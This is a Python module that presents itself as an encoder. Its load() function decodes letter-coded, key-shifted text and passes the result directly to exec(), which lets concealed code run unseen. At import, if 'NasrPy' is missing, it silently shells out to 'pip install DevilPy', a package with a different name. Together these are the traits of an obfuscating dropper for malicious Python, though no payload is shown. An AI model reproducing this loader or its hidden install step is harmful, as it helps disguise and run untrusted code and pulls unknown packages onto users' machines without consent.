import os
try:
    import NasrPy
except ImportError:
    os.system("pip install DevilPy")
import random
import string
RA = {
    '1': 'W ',
    '2': 'E ',
    '3': 'A ',
    '4': 'K ',
    '5': 'S ',
    '6': 'Z ',
    '7': 'M ',
    '8': 'O ',
    '9': 'D ',
    '0': 'T '
}

JSW = 'G'

def generate_key(length: int = 12) -> str:
    return ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=length))

def encode_character(char: str, key: int) -> str:
    return str(ord(char) + key)

def dump(text: str) -> bytes:
    rui = []
    ru = []
    key = random.randint(1, 100)
    for char in text:
        rui.append(encode_character(char, key))
    for value in rui:
        for digit in value:
            ru.append(RA[digit]) 
        ru.append(JSW) 
    encrypted_key = generate_key()
    for digit in str(key):
        ru.append(RA[digit])
    ru.append(JSW)
    ru.append(encrypted_key)
    return ''.join(ru).encode('utf-8') 
def decode_character(encoded_char: str) -> str:
    for im, ip in RA.items():
        if ip == encoded_char + " ":
            return im
    return ''
def load(text: bytes) -> str:
    _ts = ''
    _d = []
    lis = text.decode('utf-8').split(JSW)
    key_string = lis[-2]
    key = ''
    for io in key_string.split(" "):
        key += decode_character(io)
    lis.remove(lis[-2])
    for value in lis:
        for io in value.split(" "):
            _ts += decode_character(io)
        _ts += ','
    for item in _ts.split(','):
        if len(item) >= 1:
            _d.append(chr(int(item) - int(key)))
    
    exec(''.join(_d))

def validate_input(text: str) -> bool:
    return isinstance(text, str) and len(text) > 0


